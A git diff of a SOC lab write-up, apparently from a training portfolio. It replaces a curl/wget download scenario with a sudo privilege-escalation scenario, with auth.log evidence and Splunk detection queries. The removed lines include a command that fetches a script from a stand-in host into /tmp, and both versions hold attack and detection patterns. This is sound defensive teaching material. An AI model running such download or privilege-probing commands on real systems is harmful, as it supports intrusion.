@@ -33,85 +33,76 @@ The attacker successfully authenticates to the system using SSH with a standard 
 - Authentication method: SSH password login
 - Result: Login successful
 
- 
+### Privilege Escalation Attempt
+After gaining access, the attacker attempts to execute privileged commands using `sudo`.
 
-Executed commands:
-- `curl http://example.com`
-- `wget http://example.com -O /tmp/test.sh`
-
-Characteristics of the attack:
-- Commands are commonly abused to download remote content
-- No payload execution was performed
-- Targeted account: `admin`
-- All activity was logged in `/var/log/auth.log`
-
----
-
-## Investigation Phase
-
-### Purpose
-The purpose of this phase is to gain visibility into command execution by identifying:
-- Which commands were executed
-- Under which privilege context
-- On which host and at what time
-
-This mirrors a SOC analyst’s initial investigation after detecting suspicious post-login activity.
-
-### Investigation Query
-```spl
-index=main source="/var/log/auth.log" ("curl" OR "wget")
-| table _time host USER _raw
+Commands executed:
+```
+sudo -l
+sudo whoami
 ```
 
-### Explanation
-- Filters authentication logs for suspicious command keywords
-- Displays the full raw log for command context
-- Uses the `USER` field to identify the execution privilege
-
-## Outcome
-- Confirmed execution of `curl` and `wget` commands
-- Identified commands executed under elevated privileges
+Expected Behavior:
+- Commands fail due to lack of sudo privileges
+- Unauthorized sudo attempts are logged
 
 ---
 
-## Detection Phase
-### Purpose
-Based on the investigation findings, a detection query was created to reliably identify suspicious command execution while minimizing noise from investigative or benign administrative commands.
+## Log Evidence (Victim VM)
 
-### Detection Query
+Relevant entries observed in `/var/log/auth.log`:
+- Successful SSH login session for `user1`
+- Unauthorized sudo attempts:
+  - `command not allowed`
+  - `user NOT in sudoers`
+
+These entries indicate a **privilege escalation attempt by a non-privileged account.**
+
+---
+
+## Splunk Investigation
+To investigate potential privilege escalation attempts, sudo-related authentication logs were queried in Splunk.
+
+### Query used:
 ```spl
-index=main source="/var/log/auth.log" ("curl" OR "wget")
-| search NOT ("grep" OR "apt")
-| stats count by host USER COMMAND
-| where count >= 1
+index=* source="/var/log/auth.log"
+| search _raw="*sudo:*user1*"
+| table _time host _raw
 ```
 
-### Detection Logic
-- Detects usage of commonly abused command-line utilities
-- Investigative and package management commands such as `grep` and `apt` were excluded to reduce false positives and focus on potentially malicious command execution.
-- Aggregates by host, execution user, and full command
-- Suitable for reuse as an alerting rule
+### Purpose:
+- Identify sudo execution attempts by a non-privileged user
+- Reduce noise by focusing on a specific account involved in the incident
+  
+---
 
-This approach prioritizes clarity and reliability over overly complex parsing logic.
+## SOC Analysis 
+From a SOC perspective:
+- The account involved does not belong to the sudoers group
+- The commands executed are commonly used for privilege discovery
+- Unauthorized sudo attempts indicate a potential privilege escalation attempt
+- Further investigation is required to determine intent and scope
 
 ---
-## Findings
-- Detected suspicious command execution events : 2
-- Commands observed: `curl`, `wget`
-- Execution context: root (via sudo)
-- Host affected: Single Ubuntu server
 
-The activity aligns with expected patterns of post-authentication reconnaissance or staging behavior.
+## Key Findings
+- A non-privileged account attempted to execute sudo commands
+- The system correctly denied privilege escalation
+- Logs provide clear evidence for detection and investigation
+- Splunk enables efficient identification of suspicious sudo behavior
 
 ---
-## Response & Mitigation
-- Review executed commands and retrieved files
-- Audit sudo usage and privilege escalation paths
-- Monitor for repeated or chained command execution
 
-## Notes
-- The `USER` field represents the privilege context under which the command was executed, rather than the SSH-authenticated user.
-- Investigation and detection queries intentionally differ to reflect real SOC processes.
+## Skills Demonstrated
+- Linux privilege escalation detection
+- Authentication log analysis
+- SIEM query development (Splunk)
+- SOC triage and investigation workflow
+- Security event contextual analysis
+
+---
+## Conclusion
+This scenario demonstrates how a SOC analyst can identify and investigate unauthorized privilege escalation attempts by analyzing Linux authentication logs and correlating events within a SIEM platform.
 
 
 ## Screenshots
